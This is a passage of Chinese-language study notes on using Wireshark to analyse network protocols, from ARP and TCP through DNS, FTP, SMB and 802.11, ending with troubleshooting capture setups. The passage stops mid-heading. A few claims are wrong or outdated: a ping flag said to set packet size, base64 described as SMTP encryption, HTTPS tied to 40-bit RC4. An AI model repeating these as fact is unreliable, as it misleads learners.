地址解析协议，用于将ip地址解析为mac地址，因为网络中 连接各个设备的交换机使用了内容可寻址存储器，这个存储器，这个存储器维护的ARP表列出了其在每一个端口的所有连接设备的mac地址，当交换机收到了指向特定mac地址的网络流量的时候，就会根据这个表来确定应该使用哪个端口来发送流量。如果目标mac地址是未知的，那么传输设备首先会在它的缓存中查找，没有，就需要在网络中额外的通信中解析</p><p><strong>为什么通信中需要的是mac地址呢？</strong></p><p>因为数据先到的是物理层，然后不能越过数据链路层跳到网络层，所以得到的一定是mac</p><p>ARP 是在rfc中定义的 </p><p><strong>ARP 的工作原理：</strong></p><p>主机A需要和主机B通信，首先A要在自己的本地arp缓存表中找B对应的mac，如果没有那么就会发送广播，主机B收到广播之后就会把A对应的ip和mac地址存到自己的arp表中<br>然后将自己的mac地址和arp响应消息回复给A（单播），A收到之后就把B的Ip和mac地址写入自己的缓存表中，本地缓存120s</p><p>ARP协议的opcode 是操作码，请求为1 响应为2</p><h3 id="2-分析ip数据包"><a href="#2-分析ip数据包" class="headerlink" title="2.分析ip数据包"></a><strong>2.分析ip数据包</strong></h3><p><strong>存活时间（time to live&#x2F;ttl）：</strong></p><p>数据包的存活周期，在数据包被丢弃之前所能经历的时间&#x2F;最大路由数，是在数据包创建的时候生成的，并且经过路由时自减一（ttl是按照时间计算的，所以特别繁忙的路由可能耗时长，ttl减去的超过1，但大多是由情况下认为减去1）</p><p><strong>ip分片：</strong></p><p>将一个数据流分为更小的片段，是ip为了解决跨越不同类型的网络时可靠传输的特性。<br>数据包的分片主要是基于数据链路层使用的最大传输单元MTU 的大小， 以及使用第二层协议的设备的配置情况，以太网默认的MTU是1500，最大传输的数据包的大小是1500字节（不包括14个字节的头部），当传输一个数据包的时候会首先将数据包的大小与将把数据包传出去的网络接口的大小比较，确定是否需要将数据包分片。</p><p>1.设备先将数据分成若干个能成功传输的数据包 </p><p>2.然后每个ip头的总长度域被设置为每个片段的分片长度，</p><p>3.更多分片标志会在数据流的每个数据包中置为1，等待下一个数据包</p><p>4.最后一个数据包被设置为0，</p><p>5.IP头中的部分分片偏移被设置</p><p>第一个数据包的分片偏移是0，第二个数据包的分片偏移是1480，因为第一个数据包的总长度是1500其中20个是ip头信息</p><p>几个数据包被认为是属于同一个序列是因为所有的identification 都是一样的值</p><p>为了不要捕获到太多的无用信息，我们可以在capture 中设置捕获过滤器</p><pre><code class="hljs">ping  xxx.xxx.xxx.xxx -i 3000 指定数据包的大小是3000</code></pre><h3 id="3-TCP，UDP协议的分析"><a href="#3-TCP，UDP协议的分析" class="headerlink" title="3.TCP，UDP协议的分析"></a><strong>3.TCP，UDP协议的分析</strong></h3><p><strong>TCP是一个面向连接的可靠的基于Ip的传输层协议</strong></p><p>主要目的是提供可靠的数据的端到端的传输，能够处理数据的顺序传输以及错误恢复，并保证数据能到达目的地</p><p><strong>UDP是无连接的协议，提供面向 事务的简单的不可靠的传输</strong></p><p>wireshark 默认会把一个TCP三次握手的seq 的值设置为相对值，也就是从0开始，我们如果想还原，就去偏好设置中<br>找到protocals 中的analyze TCP sequence number  ，把√去掉。</p><p>RST数据包能在通信的开始或者是过程中终止连接</p><p>UDP用户数据报协议，主要为了提供高速的服务，应用层协议DNS和DHCP高度依赖数据的快速传输所以需要UDP协议</p><p>选中数据包可以右键 colorize 选择协议就能快速找到匹配的项，点击file 可以按照range 导出对应序号的数据包</p><p>也可以右键标记然后导出</p><h3 id="4-TCP滑动窗口"><a href="#4-TCP滑动窗口" class="headerlink" title="4.TCP滑动窗口"></a><strong>4.TCP滑动窗口</strong></h3><p>TCP发包之后，由于不知道对方有没有接收到所以就需要等待确认包的到达，这样的效率比较低，最好的方式就是一口气发送全部是数据包，但是必须要确定对方的缓存大小以及带宽，而且很容易产生丢包的现象，所以发送方需要知道接收方的接收窗口和带宽哪一个才是瓶颈，在限制的范围内进行发送一口气能发送的数据量其实就是TCP窗口的大小。</p><p>因为TCP是有序的传输，因此每个数据段都要标上一个序列号seq，这样接收方收到乱序的数据包的时候就可以根据seq进行排序了</p><p>tcp传输中每一个ip都维护着一个自己的seq值，自己seq的值加上自己包的长度就是下一个自己seq的值</p><p>数据包的长度是不包括TCP头部的长度的，</p><p>接收方响应的ACK的值就是发送方的seq加上发送的数据包的长度，表示接收方已经收到了seq+len之前的所有数据</p><p><strong>滑动窗口</strong></p><p>用来检测什么时候数据包丢失，调整数据的传输速率，避免丢失情况的加剧，利用接收方的数据接受窗口对数据流进行控制，接收方的窗口告诉发送方自己希望在缓冲区中存入多少数据</p><p>如果窗口大小为0，那么就是告诉发送方不要再发送数据，但是发送方还会发送保活数据包，保持与接收方的连接，这种数据包会周期性地发送，用来探测服务器是否正常工作。一旦服务器恢复正常，通信又将继续</p><h3 id="5-TCP-重传"><a href="#5-TCP-重传" class="headerlink" title="5.TCP 重传"></a><strong>5.TCP 重传</strong></h3><p>当TCP传输中出现错误的时候，最基本的恢复方式就是TCP的重传，主要是为了解决数据包的丢失问题。很多情况都可能导致数据包的丢失，比如说路由器的负载过重，应用程序出现故障，或者临时性的服务中断等。</p><p>重传计时器是决定是否要进行重传的重要机制，它维护着一个叫做重传超时的东西，简称RTO。</p><p>使用TCP传送的时候重传计时器就会启动，当收到ACK确认包的时候计时器就停止，发送数据包到收到确认包的时间间隔叫做往返时间RTT，将若干个RTT求和并计算平均值就能得出RTO的值。</p><p>在计算出RTO的值之前，我们的传输依赖的是默认的RTT的值，一旦RTO确定，重传计时器就会被应用于每一个数据包</p><p>每次没有收到ACK的时候RTO就会翻倍，直到达到规定的上限<br>Windows一般重传5次 Linux重传15次</p><p>PSH 是push 带表数据到达接收方不会在缓冲区排队而是直接交给应用程序</p><p>如果接收方收到了乱序的TCP数据包，就会判断数据包丢失，为了重组数据，接收方必须得到重组的数据包，所以发送带有丢失数据包序列号的ACK，就会发送重复的ACK应答包</p><p>这时候发送方发现可能数据包丢失了，于是立即开启快速重传机制，停止一切正在传输的数据，重发丢失的数据包</p><p>TCP option 里面的 SACK 表示已经收到的数据包</p><h3 id="6-用途广泛的ICMP"><a href="#6-用途广泛的ICMP" class="headerlink" title="6.用途广泛的ICMP"></a><strong>6.用途广泛的ICMP</strong></h3><p>互联网控制消息协议，用于提供在TCP&#x2F;IP网络上设备、服务协议、路由器可用性的信息，大多数网络检修技巧和工具都是基于常用的ICMP消息类型，ICMP协议依靠IP协议完成其任务，通常也是IP协议的集成部分。</p><p>分析ICMP数据包的时候我们需要重点关注头部的type 和code</p><p>type表示ICMP基于RFC规范的类型或者分类，code表示ICMP基于RFC规范的子类型</p><p>type 8  code 0 是请求</p><p>type 0 code 0 是响应</p><p>请求对应的回应的seq的值是一样的，data 也是一样的</p><p>data 可能会被攻击者利用，用来判断操作系统或者用来放一些特殊语句，作为反向连接的手段</p><p>除了ping ICMP的另一个应用就是路由跟踪 tracert 命令<br>通过不断增加ttl的值判断两台机器之间的路由数</p><h3 id="7-易被忽视的DHCP"><a href="#7-易被忽视的DHCP" class="headerlink" title="7.易被忽视的DHCP"></a><strong>7.易被忽视的DHCP</strong></h3><p>动态主机配置协议，是一个局域网的协议，用于给内部网络或者网络服务提供商自动分配ip地址，属于应用层的协议，因为客户端对此服务有较高的速度的要求，并且DHCP内部也有相应的维护机制，所以UDP是最佳的选择所以DHCP基于UDP工作的</p><p>DHCP 的来源是bootstrap，后来发展为更复杂功能更强大的DHCP，但是由于wireshark使用的还是bootstrap 所以我们还是只能看到bootstrap</p><p>网络上首先要有一台DHCP的服务器，网络上的其他主机就是DHCP的客户端。</p><p><strong>DHCP的工作过程分为四个阶段</strong></p><p>1.discover  客户端请求地址的时候并不知道DHCP服务器的位置，所以会在本地网络内以广播的形式发送请求数据包</p><p>2.offer 在收到discover数据包之后DHCP服务器就会在自己的地址池中找到合适的ip地址以及相应的租约期限，以及其他的配置信息如网关、DNS服务器等</p><p>3.request  DHCP客户端可能会收到很多的offer，所以必须选择一个，一般来讲会选择第一个OFFER，并回应一个request 数据包给对应的服务器。当租约期限过去一半的时候客户端会向DHCP服务器发送单播requeat数据包用来延续租期，如果没收到ACK的回应就会在租期过去3&#x2F;4的时候再次发送广播request来延续租期</p><p>4.ACK  DHCP服务器根据收到的request 数据包携带的Mac地址查找有没有相应的租约记录，如果有就会发送ACK通知用户可以继续使用分配的ip地址，</p><p><strong>DHCP数据包的捕获：</strong></p><p>因为只有在ip地址过期或者重启系统的时候才能捕获，所以我们可以选择重启网卡的方式代替，Windows下使用</p><pre><code class="hljs">ipconfig /releaseipconfig / renew </code></pre><p>为了过滤掉多余的数据包，我们可以使用过滤条件bootp来过滤DHCP</p><p>discover 数据包的发送方是0.0.0.0 因为此时还没有分配ip，<br>你会发现DHCP服务器给客户端发送的offer的时候客户端是有IP地址的，但是此时DHCP服务器还没有分配ip，其实这个时候的ip是DHCP服务器使用的ARP提供的硬件地址 给客户端与其进行通信</p><p>offer数据包和discover数据包有着相同的事务id 这样才能对应</p><p>局域网内的网关的地址就是DHCP的地址<br>路由器就有DHC服务器的功能</p><h3 id="8-不可或缺的DNS"><a href="#8-不可或缺的DNS" class="headerlink" title="8.不可或缺的DNS"></a><strong>8.不可或缺的DNS</strong></h3><p>域名与ip地址是一对一或者多对一的关系<br>DNS，作用是将域名解析为IP地址，DNS协议运行于UDP之上，使用53端口</p><p>DNS使用的C&#x2F;S的架构，当客户程序通过主机名称访问另一台主机的时候首先需要得到主机名称对应的ipi地址，因为ip数据包中需要的是ip地址，那么首先从本地计算机的hosts文件中得到对应的ip地址，如果本地不能解析，那么就需要向本地主机设定的NDS服务器查寻，（本地hosts可能造假）</p><p><strong>解析过程：</strong></p><p>客户向本地域名服务器发起查询请求，如果本地有就会返回，没有就会发起，查找地址的过程，向根域名服务器询问，根域名服务器虽然不能提供给他ip地址，但是会把com 的域名服务器的ip地址给他，让他去找。本地域名服务器就会去问com服务器，com服务器也不能给他就会把xxx.com的域名服务器的地址给本地域名服务器，然后本地域名服务器再去请求这个服务器得到ip然后返回给客户端</p><p><strong>递归查询和迭代查询</strong></p><p>客户机向本地域名服务器的查询就是递归查询<br>本地域名服务器向其他服务器的查询就是迭代查询</p><p><strong>在DNS的头部中的queries中我们可以看到</strong></p><p>Name : 查询的域名</p><p>Type :  域名类型 A</p><p>class ： 地址类型是IN 互联网</p><p><strong>dns 区域传送</strong></p><p>区域是一个DNS服务器所授权管理的名字空间</p><p>如：子域名可以有子DNS服务器成为子域名的权威</p><p>区域传送指的是由于冗余备份的需要，在两台设备之间，传送区域数据，在拥有多个dns服务器的组织中管理员通常都会配置一台备用的DNS服务器，用于维护一台主服务器的DNS信息拷贝<br>防止主DNS服务器不可用的情况的出现，但是如果配置不当就会使得匿名用户获得DNS服务器某一域的所有记录，将整个网路的基础业务和网路架构对外暴露，造成 严重的信息泄漏</p><p><strong>区域传送分为两种：</strong></p><p>1.完整区域传送 AXFR  整个区域进行传送</p><p>2.增量区域传送 IXFR 仅传送区域的一部分</p><blockquote><p><strong>注意：</strong></p><p>虽然DNS 是使用UDP 的，但是在区域传送这种任务的时候使用的是TCP协议</p></blockquote><h3 id="9-每天都接触到的HTTP"><a href="#9-每天都接触到的HTTP" class="headerlink" title="9.每天都接触到的HTTP"></a><strong>9.每天都接触到的HTTP</strong></h3><p>http是无状态的协议，也就是说客户端与服务端不需要建立持久的连接，也就是说当客户端向服务器发出请求，服务器返回响应之后连接随之关闭，服务器也不会保留连接的相关信息<br>http遵循的是请求和应答的模型</p><p><strong>http连接分为四个阶段：</strong></p><p>1.三次握手建立TCP连接</p><p>2.发送请求信息</p><p>3.发送响应信息</p><p>4.四次挥手关闭连接</p><p>因为浏览网页使用的是get请求<br>我们可以这样过滤</p><pre><code class="hljs">http.request.method==GET</code></pre><blockquote><p><strong>注意：</strong> </p><p>整个http协议是基于TCP的所以三次握手是TCP<br>，只有请求的开始和结束用的是http协议（主要用于发送应用层的控制命令），之后的数据的传输用的还是tcp，四次挥手还是TCP</p></blockquote><h3 id="10-为安全而生的HTTPS"><a href="#10-为安全而生的HTTPS" class="headerlink" title="10.为安全而生的HTTPS"></a><strong>10.为安全而生的HTTPS</strong></h3><p>其用SSL作为http应用层的子层，使用443端口<br>SSL使用40位关键字作为RC4流加密算法<br>服务端和客户端的信息都会进行加密</p><p>客户端使用https的URL请求web服务器，<br>服务器返回包含有公钥的证书给客户端<br>客户端与服务端商量信息加密的等级<br>浏览器根据商量好的加密等级生成会话密钥<br>用公钥对会话秘钥进行加密，传送给网站<br>服务器用私钥解密会话密钥，并用会话秘钥加密通信数据</p><p>TLS是SSL的升级版，二者都是在传输层对网络连接进行加密的</p><p>1.TCP三次握手</p><p>2.client hello  开始一个新的加密连接<br>在ssl中我们可以看到客户端支持的TLS版本，用于产生对话密钥 的随机数，cipher suites —支持的加密算法数量</p><p>3.server hello  服务器发送给客户机的确认信息<br>使用RSA算法验证证书以及交换密钥，使用AES对数据进行加密，使用SHA校验消息的内容<br>客户机收到服务器的响应的时候会首先验证服务器的证书，如果证书是由不可信的机构颁发的或者证书中的域名和实际的域名不符那么就会向访问者显示一个警告，如果证书没有问题，那么浏览器就会从证书中取出公钥，向服务器发送一些信息</p><p>4.客户端把生成的密钥经过公钥加密之后传给服务端</p><p>5.之后数据的传输都是使用的普通的http协议，但是是经过密钥加密的</p><p>用户可以发送通过TLS层经过RC4加密的HTTP的消息，也可以解密服务端经过RC4加密的消息，并且会使用哈希算法验证消息是否被篡改</p><p>HTTPS也不是绝对的安全，我们只要有对应的密钥就能解密，密钥一般都在服务器端，密钥的加载方法是通过wireshark的偏好设置选择SSL </p><h3 id="11-协议中的化石-FTP"><a href="#11-协议中的化石-FTP" class="headerlink" title="11.协议中的化石 FTP"></a><strong>11.协议中的化石 FTP</strong></h3><p>文件传输 协议，分为服务器和客户端两个部分<br>FTP服务器用于文件的存贮，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的数据，FTP的传输效率高，适合于传输比较大的数据</p><p><strong>运行在20和21两个端口</strong></p><p>20号端口用于在客户端和服务器端传送数据流</p><p>21号端口传输控制流（用户名、密码、传输方式等）</p><p>当用户需要从服务器下载数据的时候，可以通过控制界面让客户端的控制进程发起一个TCP连接请求，服务器端的控制进程接收到这个请求之后建立控制连接。但是此时双方还不能传送数据，所以双方的数据传送进程还需要一个数据传送连接</p><p>当客户端发起TCP请求的时候使用的是服务器默认的21号端口，然后告诉服务器一个空闲的端口号用于以后建立数据传输连接，服务器端使用默认的20号端口与客户端建立数据传输连接</p><p>控制连接是一直存在的，但是数据连接在数据传输结束之后就会断开，下一次传输的时候需要重新建立数据连接，这就使得FTP传输的效率比较低</p><p>FTP是使用明文传输 用户名和密码的，不适合于高安全性的传输</p><p>Request PORT 10,32,200,41,208,185 表示客户端希望从ip为<br>10.32.200.41 端口号 208x256+185 &#x3D;53433访问对方的数据端口</p><p>FTP的数据实际上是用TCP传输过去的，并且最开始TCP连接的建立是由服务器端发起的</p><p>由于FTP的不安全性，我们常常需要为其配置防火墙，但由于TCP连接是由服务器发起的，如果客户端的防火墙拦截了服务器的请求那么很可能传输会失败</p><p>所以我们可以使用FTP 的被动模式，可以在客户端设置<br>PASV，（如果是主动模式ip地址和端口号就是客户端发给服务器的）</p><p>想要退出就可以在命令行输入bye ，服务器就会返回一个goodbye 然后就能退出FTP服务</p><p><strong>主动和被动模式的区别和联系</strong></p><p>第一步是一样的，都是客户端开启一个非特权端口去连接服务器的21<br>但是第二步是不同的（记住，主动是针对服务器而言）</p><p>**主动模式：**最后一步服务器主动连接客户端<br>客户端开启一个非特权端口，并发送一个PORT请求 告诉服务器自己的ip 和端口，让服务器20来连接</p><p><strong>被动模式：</strong> 最后一步服务器被客户端连接<br>发送PASV给客户端，告诉客户端自己的ip和端口，让客户端来连接</p><blockquote><p><strong>注意：</strong> </p><p>windows 上的ftp只能是主动模式</p></blockquote><h3 id="12-固若金汤的Kerberos"><a href="#12-固若金汤的Kerberos" class="headerlink" title="12.固若金汤的Kerberos"></a><strong>12.固若金汤的Kerberos</strong></h3><p>kerberos 是一种计算机网络认证的协议，允许一个实体在非安全的网络中通信，可以 向另一个实体以一种安全的方式证明自自己的身份。针对C&#x2F;S架构，并提供了一系列的交互认证，用户和服务器都能相互认证对方的身份，可以保护网络实体免受窃听和重放攻击，基于对称的密码学算法，并需要一个值得信赖的   第三方作为中介（KDC），kerberosx协议的扩展可以为认证的某些阶段提供公钥密码学知识</p><p>加载密钥要在 偏好设置里面选择KRB5 </p><h3 id="13-LINUX-中的NFS解析协议"><a href="#13-LINUX-中的NFS解析协议" class="headerlink" title="13.LINUX 中的NFS解析协议"></a><strong>13.LINUX 中的NFS解析协议</strong></h3><p>网络文件系统，允许网络中的计算机之间通过TCP&#x2F;IP网络共享资源，在NFS 的应用中本地NFS的客户端应用，可以透明地读写位于远端NFS服务端的上的文件，就像访问本地文件一样，windows平台一般不会使用而是在Linux和unix中使用</p><p>首先客户端询问端口 GETPORT   Call   reply in 2 表示回应在2号数据包<br> GETPORT Replay   port :2049    Call in 1  表示对一号数据包的回应</p><p>然后客户端尝试连接服务器的NFS进程，并且还能判断2049是否被防火墙拦截，以及NFS服务是否已经启动<br>服务器回应可以连接</p><p>portmap 然后客户端尝试连接服务器的mount服务并询问服务端的mount端口(如果这一步没有收到回应，很可能是防火墙做了拦截)</p><p>服务器回应端口号</p><p>客户端尝试连接（如果是这一步没有回应很可能是共享目录的配置错误）</p><p>服务器回应可以连接</p><p>客户端请求挂载到 &#x2F;code目录</p><p>服务器同意了客户端的请求</p><p>客户端尝试NFS服务是否能连接上</p><p>服务器回应可以连接上（这两步实际上是没有必要的，因为NFS服务一直开启着，可能是bug）</p><p>客户端需要看到文件的属性</p><p>服务端回应</p><p>NFS的安全机制包括对客户端的访问控制和用户的权限控制，访问控制是通过ip地址实现的，创建共享目录的时候可以指定哪些ip允许读写，哪些ip只能读，哪些ip没有任何权限。</p><p>NFS只认UID不认用户名，所以创建文件的时候在你服务器上UID对应的admin 但是在客户端相同的UID不一定是admin，所以必须保证UID和用户名的映射一致</p><p>FH是filehandle<br>一下子发送多条消息，等待多条回应的效率比一条发一条收的高<br>mount 的默认挂载方式是异步挂载，这样在写入数据的时候就能异步写入（一下子发送多条消息），否则就是同步写入，一条发一条收</p><h3 id="14-windows-中的文件共享协议CIFS"><a href="#14-windows-中的文件共享协议CIFS" class="headerlink" title="14.windows 中的文件共享协议CIFS"></a><strong>14.windows 中的文件共享协议CIFS</strong></h3><p>这是微软字节维护的SMB协议又叫做CIFS协议，windows中的文件共享比较简单只要右键选择共享并进行配置就可以了，这样在其他电脑上就能通过ip地址和共享名进行访问</p><p>CIFS协议，使用的是445 端口</p><p>以TCP的三次握手开始<br>之后就是一个协商数据包，客户端将自己支持的CIFS版本如NT LM 0.12以及SMB版本2.002发给服务器<br>服务器做出回应<br>建立CIFS  session  会出现许多的session setup 数据包，主要的目的是进行身份的验证，常用的方式是KERBEROS 和NTLM（如果有访问不了服务器的情况，很可能就是session setup出了问题）<br>认证完成之后就会请求打开服务器的文件共享，显示为tree connect<br>服务器返回一个响应包，告诉客户端一个tree id ，客户端需要用这个tree ID 来访问共享的文件（由于tree connect 是不会检查权限的所以任何用户都能得到这个tree ID ）</p><p>create 是CIFS中非常重要的操作，无论是文件的新建目录的打开，还是文件的读写都要使用create，如果我们此时没有权限那么就会遇到access denied的错误，或者在覆盖文件的时候就会遇到file already exxixt 的提醒。</p><p>客户端可以把文件缓存在本地，用完之后再同步会服务器端。当只有一个用户的时候客户端缓存一个文件是安全的，但是多个用户同时访问一个文件就会出现问题。</p><p>因此CIFS采用了oplock （机会锁），</p><p><strong>oplock一共有三种类型：</strong></p><p>1.Exclusive  允许读写内存</p><p>2.Batch   允许缓存的所有操作</p><p>3.Level II   只允许读缓存</p><p>我们在文件传输之前机已经经过了70多个数据包，这其实揭示了一个非常经典的问题，为什么复制一个1MB的文件要比复制1024个1KB的文件速度快？<br>因为复制1MB的文件只要准备一次而复制1024个文件要准备1024次</p><p>数据的传输是没有加密的<br>windows xp 中是同步的<br>windows 7 是异步的</p><h3 id="15-E-Mail-数据包的分析"><a href="#15-E-Mail-数据包的分析" class="headerlink" title="15.E-Mail 数据包的分析"></a><strong>15.E-Mail 数据包的分析</strong></h3><p>电子邮件服务是基于C&#x2F;S架构的，但是从发件人到收件人的过程中还需要邮件服务器的传输<br>MUA 邮件用户代理&#x2F;邮件客户端软件，该软件的功能是提供邮件的发送接收和管理界面<br>MTA 邮件传输代理&#x2F;邮件服务器端软件，用于接收客户端软件发送的邮件，并将邮件传送给其他的MTA程序<br>MDA 邮件分发代理，负责将邮件服务器中的邮件分发到用户的邮箱目录,MDA不是直接面向用户的，而是在后台默默地工作，MDA软件的功能可以集成在MTA中所以往往被忽略</p><p><strong>过程：</strong></p><p>MUA 使用SMTP协议将邮件发送给MTA ,MTA收到邮件之后会根据收件人的信息决定下一步的动作，如果收件人是自己系统上的用户就可以直接投递，反之就可以把邮件传递给对方网络系统中的MTA，这之间可能需要多个MTA 的转发，（如果邮件无法交给本地用户也无法交给其他的MTA就需要把邮件退还给发件人或者发通知邮件给管理员），对方网络系统的MTA接收到了邮件发现目的地是自己系统的用户，就会交给MDA进行处理，MDA就会把邮件投递到收信人的信箱，收件人是通过MUA读取邮件的，但是这个时候的MUA连接的并不是发邮件时联系的MTA而是另一个提供POP或者IMAP服务的软件，而且读取邮件的时候采用的协议也不是SMTP而是POP3或者说IMAP</p><p>SMTP<br>简单邮件传输协议，是一种由原地址到目的地址传送邮件的规则，由他控制邮件的中转方式，SMTP属于TCP&#x2F;IP协议族使用默认端口25,帮助每一台计算机在发送和中转信件的时候找到目的地，通过SMTP指定的服务器就可以把EAIL  寄到收信人那里了<br>（SMTP是不支持明文的，一般采用base64的编码方式对加密）</p><p>SMTP协议是遵循SMTP协议的发送邮件服务器，用来发送或者中转发出的电子邮件，使用可靠的TCP的传输方式把邮件从发送人的服务器传到收信人的服务器，</p><p>和大多数的应用层的协议一样，SMTP也有两个端，在发信人的服务器上的邮件客户端和在收信人服务器上的服务端，他们同时运行在每个邮件服务器上</p><p>POP， 邮局协议，目的是从邮件服务器收取邮件，大多数的MUA软件都支持使用POP协议,POP使用的TCP端口是110</p><p><strong>工作模型：</strong></p><p>客户端向POP3的110 号端口发起了TCP连接请求,服务器接收到请求之后就建立了TCP连接，连接建立之后客户端就可以向服务器端发起POP3请求了。服务器根据情况决定是否要执行再给客<br>户端应答</p><p>IMAP internet 邮件访问协议（交互邮件访问协议）<br>邮件客户端可以通过这个协议从服务器获取邮件，IMAP运行在TCP&#x2F;IP协议之上，使用的端口是143.他与POP3的区别在于，客户端不需要把邮件全部下载，而是直接对服务器上的邮件进行操作</p><p>IMAP 和POP 是最常见的internet 读取邮件的标准</p><h3 id="16-E-Mail数据包的解密"><a href="#16-E-Mail数据包的解密" class="headerlink" title="16.E-Mail数据包的解密"></a><strong>16.E-Mail数据包的解密</strong></h3><p>发信人可能为了数据的保密将文件的扩展名舍去，或者改成一个错误的扩展名，所以我们拿到数据之后要分析解密之后的数据类型</p><h3 id="17-操作系统启动数据包分析"><a href="#17-操作系统启动数据包分析" class="headerlink" title="17.操作系统启动数据包分析"></a><strong>17.操作系统启动数据包分析</strong></h3><p>出现很多的TCP和DNS是因为开机启动项中有很多软件需要联网<br>我们去掉</p><pre><code class="hljs">!tcp and ! dns</code></pre><h4 id="①NBNS"><a href="#①NBNS" class="headerlink" title="①NBNS"></a><strong>①NBNS</strong></h4><p>网络基本输入输出系统名称服务器，是TCP&#x2F;IP协议上的net bios 协议族的一部分，在基于net bios 名称访问的网络上提供主机名和地址映射的方法<br>netBIOS 协议主要用于数十台计算机的小型局域网。使用应用程序的编程接口，提供了请求</p><p>低级服务的同一命令集，主要用于为局域网提供网络以及其他特殊功能，系统可以利用网络名称服务，广播等多种模式将netbios的多种模式解析为 相应的ip地址实现通信，Windows上netbios是默认开启的，所以开机时会广播自己的主机信息以获取共享的网络资源</p><h4 id="②IGMP组管理协议"><a href="#②IGMP组管理协议" class="headerlink" title="②IGMP组管理协议"></a><strong>②IGMP组管理协议</strong></h4><p>主要用于申请加入组播组，使用组地址接受请求报文，组播能使传输的效率更高，减少网络的拥塞</p><h4 id="③ARP-地址解析协议"><a href="#③ARP-地址解析协议" class="headerlink" title="③ARP 地址解析协议"></a><strong>③ARP 地址解析协议</strong></h4><p>请求获取路由器的ip，目的是连接网络</p><h4 id="④SMB"><a href="#④SMB" class="headerlink" title="④SMB"></a><strong>④SMB</strong></h4><p>有共享资源时存在</p><h4 id="⑤ICMPV6"><a href="#⑤ICMPV6" class="headerlink" title="⑤ICMPV6"></a><strong>⑤ICMPV6</strong></h4><p>客户端请求获取ipv6地址的数据包</p><p>###一道面试题</p><p>有A 和B两台主机，B本来的子网掩码是255.255.255.0 但是现在配成了255.255.255.224，问两台主机能否正常通信？</p><p><strong>答案： 能</strong></p><p>A 和B属于不同的子网，而跨子网的通信是需要默认网关的转发的</p><p>B能收到A 的ARP广播包，因为A认为B和他属于同一个子网，B会及时回复即使和A不在同一个子网</p><p>A会直接将ping请求回复给B而不经过默认网关</p><h3 id="18-无线网络数据包"><a href="#18-无线网络数据包" class="headerlink" title="18.无线网络数据包"></a>18.无线网络数据包</h3><p>重点分析802.11</p><p><strong>802.11数据包有三种类型：</strong></p><p>1.管理类型（认证，关联，信号）：<br>用于在主机之间建立第二层的连接</p><p>2.数据类型：<br>包含真正的数据，从无线网络传输到有线网络的数据包</p><p>3.控制数据包（请求发送，准予发送）：<br>控制管理数据包和数据数据包的发送</p><p>无线数据包的类型和子类型就决定了他的结构</p><p>Beacon作为一个广播数据包是由无线网络接入点WAP发送的，穿过无线信道通知所有的无线客户端存在可用的WAP并定义了连接他设置的一些参数</p><p>可以在偏好设置中添加无线专用列<br>RSSI IEE 802.11RSSI                射频信号强度<br>TX Rate IEEE 802.11 TX Rate   数据率<br>Frequency&#x2F;Channel  Frequency&#x2F;Channel  频率&#x2F;信道</p><p>WPA&#x2F;WPA2  作为网络连接的加密传输方式<br>(在we被发现漏洞之后)</p><p>WEP的通信是从接入点的质询开始，目的是去问人客户端是否有正确的密码<br>然后客户端响应接收，并用自己的wep密码解密质询的文本，传递给接入点，接入点返回响应说明认证成功与否。</p><p>WPA，成功时握手四次，失败时因为会重发所以会有8个</p><h2 id="三、排错篇"><a href="#三、排错篇" class="headerlink" title="三、排错篇"></a><strong>三、排错篇</strong></h2><h3 id="1-因配置错误导致的网络故障"><a href="#1-因配置错误导致的网络故障" class="headerlink" title="1.因配置错误导致的网络故障"></a><strong>1.因配置错误导致的网络故障</strong></h3><p>即便是规模很小的网络环境想要定位错误出现 的原因也是很困难的，这个时候就需要wireshark 抓包分析协议的流程定位错误的位置，但是很多时候错误来源于人为的配置错误 </p><p>由于现实环境中的机器比较多，究竟在什么位置部署wireshark 就成为了解决问题的关键，作为网络分析师我们尽可能的要使我们的捕获尽可能的隐蔽，一边最大限度地捕获最为原始的数据包，仅仅采集我们需要的数据却不留下任何的痕迹</p><p><strong>监听的流程</strong></p><p><strong>1.使用端口镜像</strong></p><blockquote><p><strong>特点：</strong></p><p>不留网络痕迹， 不产生额外的数据包，可在不让客户端脱机下线的情况下进行配置，适合于镜像路由器或者服务器端口</p></blockquote><p><strong>2.ARP欺骗：</strong></p><p>这种方式会在网络中注入数据包，无形中加重了流经嗅探器的流量负担，但是这有助于我们的分析，如果我们需要一个暂时性快速实施的方法，能将一个设备的网络流量进行捕获又不用让他下线，同时端口镜像又不被支持的时候这个方法就是好的选择</p><p><strong>3.集线器输出：</strong></p><p>如果不要考虑设备下线带来的影响的话，如果需要捕获多台主机的流量那么这种情况的效率就比较低，因为碰撞的丢包的情况会比较多</p><p><strong>4.网络分流器：</strong></p><p>在不需要 考虑主机暂时下线带来的后果的时候会比较实用，或者在嗅探光纤通信的时候这个就是唯一的选择但是这种方式的成本会比较高</p><p><strong>5.直接安装：</strong></p><p>指在单个主机上安装嗅探器软件（不被推荐，因为错误的主机很可能会导致包的丢失，无法反应真实的情况。但是在 进行环境测试，评估和性能审查的时候这个方法就是最佳的）</p><p>本次的问题就是用户不能访问internet 但是可以访问所有的内网资源，包括其他站的共享内容和本地服务器的应用程序。</p><p>网络架构是所有的客户机和服务器都连接到一台交换机上。用一台路由器作为默认网关，DHCP提供动态ip，不支持端口镜像，客户机可以下线</p><p>我们可以一边监听线路，一边让用户访问intrnet。<br>使用网络分流器</p><p><strong>6.网络分流器：</strong></p><p>是一个专门用于网络分析的硬件设备，不会对已有网络设备的负载带来影响，将其放置在两个端点之间用于捕获端点之间的数据包，分为两种，聚合的和非聚合的</p><p><strong>7.聚合的网络分流器：</strong></p><p>只有一个物理的流量监听口对双向的流量进行嗅探<br>我们需要拔下计算机和交换机连接的网线，然后插入聚合网络分流器的In端口，然后将交换机插入out端口，我们的装载嗅探器的电脑连接monitor端口</p><p><strong>8.非聚合的网络分流器：</strong></p><p>与聚合不同的地方是这个有两个监听端口，一个监听的是嗅探电脑到分流器的，另一个是监听从分流器到嗅探电脑的。</p><h3 id="2-揪出意外的重定向"><a href="#2-揪出意外的重定向" class="headerlink" title="2.揪出意外的重定向"></a><strong>2.揪出意外的重定向</strong></h3><p><strong>问题：能访问internet 但是不能访问google 主页</strong></p><p>向设备发SYN包之后返回的是[RST,ACK] 这个中断连接的响应包，说明这个设备并没有开启80端口的监听。</p><p>我们在包中也没看到发送给DNS服务器的为了得到google的ip地址的请求， <strong>常见的阻止DNS查询有两个条件</strong></p><p>1.发起连接的设备在dns的缓存中已经有域名到ip的映射</p><p>2.发起 连接的设备在hosts 中已经有域名到ip的映射</p><h3 id="3-问题出在对方身上"><a href="#3-问题出在对方身上" 